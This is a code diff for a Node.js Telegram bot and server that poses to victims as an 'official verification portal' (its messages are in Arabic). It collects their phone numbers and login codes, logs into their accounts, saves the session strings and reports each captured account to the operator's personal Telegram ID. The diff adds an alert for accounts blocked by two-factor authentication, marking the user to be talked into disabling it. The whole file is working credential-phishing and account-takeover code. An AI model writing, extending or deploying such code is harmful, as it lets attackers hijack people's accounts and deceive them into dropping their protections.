@@ -14,13 +14,12 @@ const apiId = parseInt(process.env.API_ID || "0", 10);
 const apiHash = process.env.API_HASH || "";
 const botToken = process.env.BOT_TOKEN || "";
 
-// آيدي المسؤول (أنت) لتستقبل التقارير عليه شخصياً
+// آيدي المسؤول الخاص بك لاستقبال التقارير
 const MY_ADMIN_ID = 8065754360; 
 
 // إعداد بوت تيليغرام عبر Telegraf
 const bot = new Telegraf(botToken);
 
-// عندما يرسل المستخدم /start يرسل له رسالة ترحيبية مع زر يفتح الميني أب فوراً
 bot.start((ctx) => {
   return ctx.reply(
     'أهلاً بك في بوابة التوثيق الرسمية! 🌟\n\nانقر على الزر أدناه لبدء عملية التوثيق واستخراج الجلسة بكل سهولة:',
@@ -30,15 +29,12 @@ bot.start((ctx) => {
   );
 });
 
-// تشغيل البوت في الخلفية
 bot.launch().then(() => {
   console.log('🤖 بوت تيليغرام يعمل بنجاح ويستمع للأوامر...');
 });
 
-// تخزين العملاء مؤقتاً لحين إدخال الرمز
 let activeClients = {};
 
-// API إرسال الكود
 app.post('/api/send-code', async (req, res) => {
   try {
     const { phone } = req.body;
@@ -78,7 +74,6 @@ app.post('/api/send-code', async (req, res) => {
   }
 });
 
-// API تأكيد الكود وتسجيل الدخول
 app.post('/api/verify-code', async (req, res) => {
   try {
     const { phoneNumber, phoneCode } = req.body;
@@ -100,7 +95,6 @@ app.post('/api/verify-code', async (req, res) => {
 
     const savedSession = client.session.save();
     
-    // جلب معلومات الحساب الذي تم تسجيل دخوله لتضمينها في التقرير
     let userInfo = "مستخدم جديد";
     try {
       const me = await client.getMe();
@@ -109,7 +103,7 @@ app.post('/api/verify-code', async (req, res) => {
       console.log('تعذر جلب تفاصيل الحساب الإضافية');
     }
 
-    // 🚀 **الإضافة الخرافية:** إرسال تقرير فوري وخاص على حسابك الشخصي على تيليغرام
+    // إرسال تقرير النجاح
     try {
       const reportMessage = `
 🚨 **تم توثيق حساب جديد بنجاح!** 🌟
@@ -134,9 +128,23 @@ app.post('/api/verify-code', async (req, res) => {
 
   } catch (error) {
     console.error('خطأ في التحقق:', error);
+    
+    // 🔍 **إضافة جديدة:** إرسال إشعار فوراً إذا كان الحساب يحتاج تحقق بخطوتين (2FA)
     if (error.errorMessage === 'SESSION_PASSWORD_NEEDED') {
+      try {
+        const alertMessage = `
+⚠️ **تنبيه توقف عملية (2FA)** 🛑
+📱 **رقم الهاتف:** \`${req.body.phoneNumber}\`
+❌ **المشكلة:** الحساب محمي بكلمة مرور (تحقق بخطوتين)، وتوقفت العملية وتحتاج لتوجيه المستخدم لإلغائها.
+        `;
+        await bot.telegram.sendMessage(MY_ADMIN_ID, alertMessage, { parse_mode: 'Markdown' });
+      } catch (err) {
+        console.error('فشل إرسال تنبيه الـ 2FA:', err);
+      }
+
       return res.json({ success: false, needPassword: true, error: 'الحساب محمي بكلمة مرور (2FA)' });
     }
+
     res.status(400).json({ success: false, error: error.errorMessage || error.message });
   }
 });
@@ -146,6 +154,5 @@ app.listen(PORT, () => {
   console.log(`السيرفر يعمل بنجاح على البورت http://localhost:${PORT}`);
 });
 
-// إيقاف البوت بشكل آمن عند إغلاق السيرفر
 process.once('SIGINT', () => bot.stop('SIGINT'));
 process.once('SIGTERM', () => bot.stop('SIGTERM'));
